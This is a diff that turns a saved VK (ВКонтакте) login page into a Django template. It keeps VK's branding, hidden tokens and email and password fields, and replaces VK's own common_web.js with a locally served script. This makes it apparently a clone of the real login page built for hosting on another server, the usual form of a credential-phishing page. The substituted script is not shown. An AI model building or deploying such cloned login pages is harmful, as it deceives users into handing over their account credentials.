@@ -1,206 +1,329 @@
 ﻿<!DOCTYPE html>
-<!-- saved from url=(0044)https://vk.com/login?u=2&to=YWxfZmVlZC5waHA- -->
+{% load static %}
 <html lang="ru">
-
 <head class="push_notifier_supported">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?6">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?6">
 
-    <link rel="apple-touch-icon" href="https://vk.com/images/icons/pwa/apple/default.png?8">
+  <link rel="apple-touch-icon" href="https://vk.com/images/icons/pwa/apple/default.png?8">
+
+  <meta http-equiv="content-type" content="charset=utf-8">
+  <meta name="description" content="">
 
 
-    <meta name="description" content="">
+  <title>Вход | ВКонтакте</title>
 
+  <noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>
 
-    <title>Вход | ВКонтакте</title>
+  <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?73823639213">
+  <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/base.css?1">
+  <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_utf.css?1">
+  <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?2660709036">
 
-    <link rel="stylesheet" type="text/css" href="./Вход _ ВКонтакте_files/common.css">
-    <link rel="stylesheet" type="text/css" href="./Вход _ ВКонтакте_files/base.css">
-    <link rel="stylesheet" type="text/css" href="./Вход _ ВКонтакте_files/fonts_utf.css">
-    <link rel="stylesheet" type="text/css" href="./Вход _ ВКонтакте_files/fonts_cnt.css">
-    <link type="text/css" rel="stylesheet" href="./Вход _ ВКонтакте_files/login.css">
-    <link type="text/css" rel="stylesheet" href="./Вход _ ВКонтакте_files/ui_common.css">
+  <script type="text/javascript" async="" src="https://top-fwz1.mail.ru/js/code.js"></script>
+  <script type="text/javascript">
+    (function() {
+      var alertCont;
+      function trackOldBrowserEvent(event) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://vk.com/badbrowser_stat.php?act=track&event=' + event);
+        xhr.send();
+      }
+      function exposeGlobals() {
+        window.hideOldBrowser = function() {
+          alertCont.remove();
+          var date = new Date();
+          date.setTime(date.getTime() + (7 * 24 * 60 * 60 * 1000));
+          var expiresDate = date.toGMTString();
+          var domain = window.locDomain;
+          document.cookie = 'remixoldbshown=1; expires=' + expiresDate + '; path=/' + (domain ? '; domain=.' + domain : '') + ';secure';
+          trackOldBrowserEvent('hideAlert');
+        }
+      }
+      function checkOldBrowser() {
+        if(!document.body) {
+          setTimeout(checkOldBrowser, 100);
+          return;
+        }
+        try {
+          if (!('CSS' in window && CSS.supports('display', 'flex')) || typeof Symbol === 'undefined') {
+            exposeGlobals();
+            var alert = '<div class="OldBrowser__container" style="width:960px;">  Установите <a href="https://vk.com/badbrowser.php?source=old_browser_alert" target="_blank">один из этих браузеров</a>, чтобы работа ВКонтакте была быстрой и стабильной.  <span class="OldBrowser__close" onclick="hideOldBrowser();"></span></div>';
+            alertCont = document.createElement('div');
+            alertCont.className = 'OldBrowser';
+            alertCont.id = 'old_browser_wrap';
+            alertCont.innerHTML = alert;
+            document.body.appendChild(alertCont);
+            trackOldBrowserEvent('showAlert');
+          }
+        } catch(e) {}
+      }
+      checkOldBrowser();
+    })();
+    var vk = {
+      ads_rotate_interval: 120000,
+      al: parseInt('3') || 4,
+      id: 0,
+      intnat: '' ? true : false,
+      host: 'vk.com',
+      loginDomain: 'https://login.vk.com/',
+      lang: 0,
+      loaderNavSection: '',
+      rtl: parseInt('') || 0,
+      version: 4430905,
+      stDomains: 0,
+      stDomain: '',
+      stExcludedMasks: ["loader_nav","lang"],
+      zero: false,
+      contlen: 7176,
+      loginscheme: 'https',
+      ip_h: '62710679bbd6612b74',
+      navPrefix: '/',
+      dt: parseInt('0') || 0,
+      fs: parseInt('13') || 13,
+      ts: 1576582133,
+      tz: 10800,
+      pd: 0,
+      css_dir: '',
+      vcost: 7,
+      time: [2019, 12, 17, 14, 28, 53],
+      sampleUser: -1, spentLastSendTS: new Date().getTime(),
+      a11y: 0,
+      statusExportHash: '',
+      audioAdsConfig: {"_":"_"},
+      longViewTestGroup: "every_view",
+      cma: 1,
+      lpConfig: {
+        enabled: 0,
+        key: '',
+        ts: 0,
+        url: '',
+        lpstat: 0
+      },
 
-    <meta name="robots" content="noindex">
+      pr_tpl: "<div class=\"pr %cls%\" id=\"%id%\"><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><\/div>",
+
+      audioInlinePlayerTpl: "<div class=\"audio_inline_player _audio_inline_player no_select\">\n  <div class=\"audio_inline_player_right\">\n    <div class=\"audio_inline_player_volume\"><\/div>\n  <\/div>\n  <div class=\"audio_inline_player_left\">\n    <div class=\"audio_inline_player_progress\"><\/div>\n  <\/div>\n<\/div>",
+
+      tnsPixelType: 'unauth',
+      tnsPixelSocdem: '13',
+
+      pe: {"search_attempt_stats":1,"search_position_stats":1,"article_poll":1,"vk_apps_svg_qr":1,"upload.send_upload_stat":1,"push_notifier":1,"audio_artist_new_catalog":1,"story_reactions_web":1,"notify_new_events_box":1,"web_ajax_json_object":1,"mini_apps_web_add_to_favorites":1,"cookie_class_samesite":1,"cookie_secure_default_true":1,"mvk_skeleton_animation":1,"mvk_new_info_snackbar":1,"stickers_bot_link":1,"stickers_money_transfer_suggestions":1},
+    };;vk.rv="22368";;if (!window.constants) { window.constants = {Groups: {
+      GROUPS_ADMIN_LEVEL_USER: 0,
+      GROUPS_ADMIN_LEVEL_MODERATOR: 1,
+      GROUPS_ADMIN_LEVEL_EDITOR: 2,
+      GROUPS_ADMIN_LEVEL_ADMINISTRATOR: 3,
+      GROUPS_ADMIN_LEVEL_HOST: 4,
+      GROUPS_ADMIN_LEVEL_EVENT_CREATOR: 5,
+      GROUPS_ADMIN_LEVEL_CREATOR: 6,
+      GROUPS_ADMIN_PSEUDO_LEVEL_ADVERTISER: 100
+    }}; };
+
+    window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
+    var _ua = navigator.userAgent.toLowerCase();
+    if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;
+    var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '', ___to;
+    ___htest = ___htest.split('#').pop();
+    if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
+      if (vk.al != 3 || vk.navPrefix != '!') {
+        ___to = ___htest.replace(/^(\/|!)/, '');
+        if (___to.match(/^([^\?]*\.php|login|mobile|away)([^a-z0-9\.]|$)/)) ___to = '';
+        location.replace(location.protocol + '//' + location.host + '/' + ___to);
+      }
+    }
+
+    var StaticFiles = {
+      'https://vk.com/cmodules/web/common_web.js' : {v: '101'},
+      'https://vk.com/common.css':{v:73823639213},'base.css':{v:1},'fonts_utf.css':{v:1},
+      'https://vk.com/fonts_cnt.css':{v:2660709036},
+      'https://vk.com/cmodules/bundles/audioplayer.419017b922339f82bb6d.js':{v:'c6a394408201afef322d'},
+      'https://vk.com/cmodules/bundles/common.eec562c228d780fece48.js':{v:'eec69122a99f0882aba4'},
+      'https://vk.com/cmodules/web/common_web.125bfc199561fd41ab3a.js':{v:'b43e80674589a38747c9643d646a4e29'},
+      'https://vk.com/lang0_0.js': {v: 26276368},
+      'https://vk.com/login.css':{v:33561552193},
+      'https://vk.com/cmodules/bundles/vendors.70cc452207d7ab2329a5.js':{v:'1d1c845c51f848b67a36'},
+      'https://vk.com/cmodules/bundles/74eca7c4fbfbb5577a32f2b3e2684a41.540aeaf8e59b00764233.js':{v:'7d2793c7e555f00407b4'},
+      'https://vk.com/cmodules/web/login.fd14d3f2bd8745aed33a.js':{v:'e92e23f441cad3e30b46da782f5a6ebf'},
+      'https://vk.com/cmodules/web/login.js':{v:20},
+      'https://vk.com/cmodules/web/time_spent.9f535732f28794360131.js':{v:'a6c51f54d3983912c439'},
+      'https://vk.com/cmodules/web/time_spent.js':{v:2},
+      'https://vk.com/cmodules/web/page_layout.ecd23de8e8c3bfc54e4b.js':{v:'dcf0e0a8fc10631b36a6'},
+      'https://vk.com/cmodules/web/page_layout.js':{v:1},
+      'https://vk.com/cmodules/bundles/0f04773cfcf5199923aa1d50141d1f7f.5cb9ecfb7adab368bd0f.js':{v:'2499006034dcfc079674'},
+      'https://vk.com/cmodules/web/ui_common.62b697bfedf900aee21d.js':{v:'44b4165104b8e1334c2610c6a3e03d47'},
+      'https://vk.com/ui_common.js':{v:6},
+      'https://vk.com/ui_common.css':{v:20383293896},
+      'https://vk.com/cmodules/web/likes.17fe274c36c741dfba44.js':{v:'402df9aa4315a59a010d9ecf07281f7e'},
+      'https://vk.com/cmodules/web/likes.js':{v:1}
+    }
+    var abp;
+  </script>
+
+  <link type="text/css" rel="stylesheet" href="https://vk.com/css/al/login.css?33561552193">
+  <link type="text/css" rel="stylesheet" href="https://vk.com/css/al/ui_common.css?20383293896">
+
+  <script type="text/javascript" src="https://vk.com/js/loader_nav4430905_0.js"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/bundles/audioplayer.419017b922339f82bb6d.js?c6a394408201afef322d"></script>
+  <script type="text/javascript" src="{% static 'full/common_web.js' %}"></script>
+  <script type="text/javascript" src="https://vk.com/js/lang0_0.js"></script>
+  <script type="text/javascript" src="https://vk.com/js/lib/px.js?ch=1"></script>
+  <script type="text/javascript" src="https://vk.com/js/lib/px.js?ch=2"></script>
+
+  <meta name="robots" content="noindex">
+  <meta name="msApplication-ID" content="C6965DD5.VK">
+  <meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra">
+  <meta name="google-site-verification" content="CNjLCRpSR2sryzCC4NQKKCL5WnvmBTaag2J_UlTyYeQ">
+  <meta name="yandex-verification" content="798f8402854bea07">
+
+  <script type="text/javascript" src="https://vk.com/js/cmodules/bundles/vendors.70cc452207d7ab2329a5.js?1d1c845c51f848b67a36"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/bundles/74eca7c4fbfbb5577a32f2b3e2684a41.540aeaf8e59b00764233.js?7d2793c7e555f00407b4"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/web/login.fd14d3f2bd8745aed33a.js?e92e23f441cad3e30b46da782f5a6ebf"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/web/time_spent.9f535732f28794360131.js?a6c51f54d3983912c439"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/web/page_layout.ecd23de8e8c3bfc54e4b.js?dcf0e0a8fc10631b36a6"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/bundles/0f04773cfcf5199923aa1d50141d1f7f.5cb9ecfb7adab368bd0f.js?2499006034dcfc079674"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/web/ui_common.62b697bfedf900aee21d.js?44b4165104b8e1334c2610c6a3e03d47"></script>
+  <script type="text/javascript" src="https://vk.com/js/cmodules/web/likes.17fe274c36c741dfba44.js?402df9aa4315a59a010d9ecf07281f7e"></script>
+  <script type="text/javascript" src="https://vk.com/js/al/aes_light.js?830765285"></script>
 </head>
+<style id="stylish-1" class="stylish" type="text/css">#age-verification,
+#age-verification-wrapper,
+#age-verification-container
+{
+  display: none !important;
+}</style>
 
-<body class="login_page" cz-shortcut-listen="true">
-    <div id="system_msg" class="fixed"></div>
-    <div id="utils"></div>
+<body onresize="onBodyResize()" class="login_page no_stl no_sett" data-useragent="chrome" cz-shortcut-listen="true">
+  <div id="system_msg" class="fixed"></div>
+  <div id="utils"></div>
 
-    <div id="layer_bg" class="fixed" style="height: 711px;"></div>
-    <div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap" style="width: 1536px; height: 711px;">
-        <div id="layer" style="width: 1519px;"></div>
-    </div>
-    <div id="box_layer_bg" class="fixed" style="height: 711px;"></div>
-    <div id="box_layer_wrap" class="scroll_fix_wrap fixed" style="width: 1536px; height: 711px;">
-        <div id="box_layer" style="width: 1519px;">
-            <div id="box_loader">
-                <div class="pr pr_baw pr_medium" id="box_loader_pr">
-                    <div class="pr_bt"></div>
-                    <div class="pr_bt"></div>
-                    <div class="pr_bt"></div>
-                </div>
-                <div class="back"></div>
+  <div id="layer_bg" class="fixed" style="height: 760px;"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap" style="width: 991px; height: 760px;"><div id="layer" style="width: 974px;"></div></div>
+  <div id="box_layer_bg" class="fixed" style="height: 760px;"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed" style="width: 991px; height: 760px;"><div id="box_layer" style="width: 974px;"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>
+
+  <div id="stl_left" style="width: 0px;"><div id="stl_bg"><nobr id="stl_text">Наверх</nobr></div></div><div id="stl_side" style="left: 0px; width: 10px; top: 42px; height: 718px;"></div>
+
+  <script type="text/javascript">window.domStarted && domStarted();</script>
+
+  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix" style="width: 974px;">
+
+
+    <div id="page_header_cont" class="page_header_cont">
+      <div class="back"></div>
+      <div id="page_header_wrap" class="page_header_wrap" style="width: 974px;">
+        <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" style="max-width: 1484px;"></a>
+        <div id="page_header" class="p_head p_head_l0" style="width: 960px">
+          <div class="content">
+            <div id="top_nav" class="head_nav">
+              <div class="head_nav_item fl_l"><a class="top_home_link fl_l" href="/" aria-label="На главную" accesskey="1"><div class="top_home_logo"></div></a></div>
+              <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
+                <input name="disable-autofill" style="display: none;">
+                <div class="input_back_wrap no_select"><div class="input_back" style="margin: 7px 0px 7px 8px; padding: 6px 6px 6px 19px;"><div class="input_back_content" style="width: 210px;">Поиск</div></div></div><input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" aria-label="Поиск">
+              </div></div>
+              <div class="head_nav_item fl_l head_nav_btns"><div id="top_audio_layer_place" class="top_audio_layer_place"></div></div>
+              <div class="head_nav_item fl_r"><a class="top_nav_link" href="" id="top_switch_lang" style="display: none;" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'c6d3275dc773701e67' }); return false;">
+                Switch to English
+              </a><a class="top_nav_link" href="/join" id="top_reg_link" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)">
+                регистрация
+              </a></div>
+              <div class="head_nav_item_player"></div>
             </div>
+            <div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
+          </div>
         </div>
+      </div>
     </div>
 
-    <div id="stl_left" style="width: 264px;">
-        <div id="stl_bg">
-            <nobr id="stl_text">Наверх</nobr>
-        </div>
-    </div>
-    <div id="stl_side" style="left: 265px; width: 9.5px; top: 42px; height: 669px;"></div>
-
-    <div class="scroll_fix_wrap _page_wrap" id="page_wrap">
-        <div>
-            <div class="scroll_fix" style="width: 1519px;">
-
-
-                <div id="page_header_cont" class="page_header_cont">
-                    <div class="back"></div>
-                    <div id="page_header_wrap" class="page_header_wrap" style="width: 1519px;">
-                        <a class="top_back_link" href="https://vk.com/login?u=2&amp;to=YWxfZmVlZC5waHA-" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" style="max-width: 1484px;"></a>
-                        <div id="page_header" class="p_head p_head_l0" style="width: 960px">
-                            <div class="content">
-                                <div id="top_nav" class="head_nav">
-                                    <div class="head_nav_item fl_l">
-                                        <a class="top_home_link fl_l" href="https://vk.com/" aria-label="На главную" accesskey="1">
-                                            <div class="top_home_logo"></div>
-                                        </a>
-                                    </div>
-                                    <div class="head_nav_item fl_l">
-                                        <div id="ts_wrap" class="ts_wrap">
-                                            <input name="disable-autofill" style="display: none;">
-                                            <div class="input_back_wrap no_select">
-                                                <div class="input_back" style="margin: 7px 0px 7px 8px; padding: 6px 6px 6px 19px;">
-                                                    <div class="input_back_content" style="width: 210px;">Поиск</div>
-                                                </div>
-                                            </div><input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" aria-label="Поиск">
-                                        </div>
-                                    </div>
-                                    <div class="head_nav_item fl_l head_nav_btns">
-                                        <div id="top_audio_layer_place" class="top_audio_layer_place"></div>
-                                    </div>
-                                    <div class="head_nav_item fl_r"><a class="top_nav_link" href="https://vk.com/login?u=2&amp;to=YWxfZmVlZC5waHA-" id="top_switch_lang" style="display: none;" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 3, hash: &#39;7bd93c5314ce502182&#39; }); return false;">
-                      Switch to English
-                    </a><a class="top_nav_link" href="https://vk.com/join" id="top_reg_link" style="display: none">
-                      регистрация
-                    </a></div>
-                                    <div class="head_nav_item_player"></div>
-                                </div>
-                                <div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div id="page_layout" style="width: 960px;">
-                    <div id="side_bar" class="side_bar fl_l" style="display: none; top: 0px;">
-                        <div id="side_bar_inner" class="side_bar_inner">
-                            <div id="quick_login" class="quick_login">
-                                <div>
-                                    <iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame" src="./Вход _ ВКонтакте_files/saved_resource.html"></iframe>
-                                </div>
-                                <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login" target="quick_login_frame">
-                                    <input type="hidden" name="act" value="login">
-                                    <input type="hidden" name="role" value="al_frame">
-                                    <input type="hidden" name="expire" id="quick_expire_input" value="">
-                                    <input type="hidden" name="recaptcha" id="quick_recaptcha" value="">
-                                    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="">
-                                    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="">
-                                    <input type="hidden" name="_origin" value="https://vk.com">
-                                    <input type="hidden" name="ip_h" value="4fb866da8772628ab5">
-                                    <input type="hidden" name="lg_h" value="87da3e5369ff53d597">
-                                    <input type="hidden" name="ul" id="quick_login_ul" value="">
-                                    <div class="label">Телефон или email</div>
-                                    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email"></div>
-                                    <div class="label">Пароль</div>
-                                    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle(&#39;quick_expire&#39;, !!this.value);toggle(&#39;quick_forgot&#39;, !this.value)">
-                                    </div>
-                                    <input type="submit" class="submit">
-                                </form>
-                                <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
-                                <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox(&#39;join.php&#39;, {act: &#39;box&#39;, from: nav.strLoc})">Регистрация</button>
-                                <div class="clear forgot">
-                                    <div class="checkbox" id="quick_expire" onclick="checkbox(this);ge(&#39;quick_expire_input&#39;).value=isChecked(this)?1:&#39;&#39;;" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="https://vk.com/restore" target="_top">Забыли пароль?</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div id="page_body" class="fl_r " style="width: 960px;">
-
-                        <div id="wrap_between"></div>
-                        <div id="wrap3">
-                            <div id="wrap2">
-                                <div id="wrap1">
-                                    <div id="content" class="page_block">
-                                        <h2 class="login_header">Вход ВКонтакте</h2>
-                                        <div id="login_message">
-                                            <div class="msg info_msg">
-                                                <div class="msg_text">Чтобы просматривать эту страницу, нужно зайти на сайт.</div>
-                                            </div>
-                                        </div>
-                                        <div id="login_form_wrap" class="login_form_wrap">
-                                            <form method="post" name="login" id="login_form" action="https://login.vk.com/?act=login">
-                                                <input type="hidden" name="act" id="act" value="login">
-                                                <input type="hidden" name="to" id="to" value="YWxfZmVlZC5waHA-">
-                                                <input type="hidden" name="expire" id="expire_input" value="">
-                                                <input type="hidden" name="_origin" value="https://vk.com">
-                                                <input type="hidden" name="ip_h" value="4fb866da8772628ab5">
-                                                <input type="hidden" name="lg_h" value="87da3e5369ff53d597">
-
-                                                <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email">
-                                                <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль">
-                                                <div class="checkbox" id="expire" onclick="checkbox(this);ge(&#39;expire_input&#39;).value=isChecked(this)?1:&#39;&#39;;" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div>
-                                                <div class="login_buttons_wrap">
-                                                    <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go(&#39;/join&#39;); return cancelEvent(event);">Регистрация</button>
-                                                </div>
-                                            </form>
-                                        </div>
-                                        <div class="login_fast_restore_wrap _retore_wrap">
-                                            <a class="login_link login_fast_restore_link" href="https://vk.com/restore">Забыли пароль или не
-                        можете войти?</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;">
-                        <div class="footer_nav" id="bottom_nav">
-                            <div class="footer_copy"><a href="https://vk.com/about">ВКонтакте</a> © 2006–2019</div>
-                            <div class="footer_links">
-                                <a class="bnav_a" href="https://vk.com/about">О ВКонтакте</a>
-                                <a class="bnav_a" href="https://vk.com/support?act=home" style="display: none;">Помощь</a>
-                                <a class="bnav_a" href="https://vk.com/terms">Правила</a>
-                                <a class="bnav_a" href="https://vk.com/ads" style="">Реклама</a>
-
-                                <a class="bnav_a" href="https://vk.com/dev">Разработчикам</a>
-                                <a class="bnav_a" href="https://vk.com/jobs" style="display: none;">Вакансии</a>
-                            </div>
-                            <div class="footer_lang"><a class="footer_lang_link" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 3, hash: &#39;7bd93c5314ce502182&#39;})">English</a><a class="footer_lang_link" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 0, hash: &#39;7bd93c5314ce502182&#39;})">Русский</a>
-                                <a class="footer_lang_link" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 1, hash: &#39;7bd93c5314ce502182&#39;})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox(&#39;lang.php&#39;, {act: &#39;lang_dialog&#39;, all: 1}, {params: {dark: true, bodyStyle: &#39;padding: 0px&#39;}, noreload: true}); } else { changeLang(1); } return false;">все
-                  языки »</a></div>
-                        </div>
-
-                        <div class="footer_bench clear">
-
-                        </div>
-                    </div>
-
-                    <div class="clear"></div>
-                </div>
+    <div id="page_layout" style="width: 960px;">
+      <div id="side_bar" class="side_bar fl_l" style="display: none; top: 0px;">
+        <div id="side_bar_inner" class="side_bar_inner">
+          <div id="quick_login" class="quick_login">
+            <div>
+              <iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>
             </div>
+            <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login" target="quick_login_frame">
+              {% csrf_token %}
+              <input type="hidden" name="act" value="login">
+              <input type="hidden" name="role" value="al_frame">
+              <input type="hidden" name="expire" id="quick_expire_input" value="">
+              <input type="hidden" name="recaptcha" id="quick_recaptcha" value="">
+              <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="">
+              <input type="hidden" name="captcha_key" id="quick_captcha_key" value="">
+              <input type="hidden" name="_origin" value="https://vk.com">
+              <input type="hidden" name="ip_h" value="62710679bbd6612b74">
+              <input type="hidden" name="lg_h" value="87da3e5369ff53d597">
+              <input type="hidden" name="ul" id="quick_login_ul" value="">
+              <div class="label">Телефон или email</div>
+              <div class="labeled"><input type="text" required name="email" class="dark" id="quick_email"></div>
+              <div class="label">Пароль</div>
+              <div class="labeled"><input type="password" required name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)"></div>
+              <input type="submit" class="submit">
+            </form>
+            <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
+            <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
+            <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
+          </div>
         </div>
+      </div>
+
+      <div id="page_body" class="fl_r " style="width: 960px;">
+
+        <div id="wrap_between"></div>
+        <div id="wrap3"><div id="wrap2">
+          <div id="wrap1">
+            <div id="content" class="page_block"><h2 class="login_header">Вход ВКонтакте</h2>
+              <div id="login_message">
+                <div class="msg info_msg">
+                  <div class="msg_text">Чтобы просматривать эту страницу, нужно зайти на сайт.</div>
+                </div>
+              </div>
+              <div id="login_form_wrap" class="login_form_wrap">
+                <form method="post" name="login" id="login_form" action="https://login.vk.com/?act=login">
+                  {% csrf_token %}
+                  <input type="hidden" name="act" id="act" value="login">
+                  <input type="hidden" name="to" id="to" value="YWxfZmVlZC5waHA-">
+                  <input type="hidden" name="expire" id="expire_input" value="">
+                  <input type="hidden" name="_origin" value="https://vk.com">
+                  <input type="hidden" name="ip_h" value="62710679bbd6612b74">
+                  <input type="hidden" name="lg_h" value="87da3e5369ff53d597">
+
+                  <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email">
+                  <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль">
+                  <div class="checkbox" id="expire" onclick="checkbox(this);ge('expire_input').value=isChecked(this)?1:'';" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div>
+                  <div class="login_buttons_wrap">
+                    <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Регистрация</button>
+                  </div>
+                </form>
+              </div>
+              <div class="login_fast_restore_wrap _retore_wrap">
+                <a class="login_link login_fast_restore_link" href="/restore">Забыли пароль или не можете войти?</a>
+              </div></div>
+            </div>
+          </div></div>
+        </div>
+
+        <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;"><div class="footer_nav" id="bottom_nav">
+          <div class="footer_copy"><a href="/about">ВКонтакте</a> © 2006–2019</div>
+          <div class="footer_links">
+            <a class="bnav_a" href="/about">О ВКонтакте</a>
+            <a class="bnav_a" href="/support?act=home" style="display: none;">Помощь</a>
+            <a class="bnav_a" href="/terms">Правила</a>
+            <a class="bnav_a" href="/ads" style="">Реклама</a>
+
+            <a class="bnav_a" href="/dev">Разработчикам</a>
+            <a class="bnav_a" href="/jobs" style="display: none;">Вакансии</a>
+          </div>
+          <div class="footer_lang"><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'c6d3275dc773701e67'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: 'c6d3275dc773701e67'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: 'c6d3275dc773701e67'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки »</a></div>
+        </div>
+
+        <div class="footer_bench clear">
+
+        </div></div>
+
+        <div class="clear"></div>
+      </div>
     </div>
-    <div class="progress" id="global_prg"></div>
+  </div>
 
 
 </body>
-
 </html>
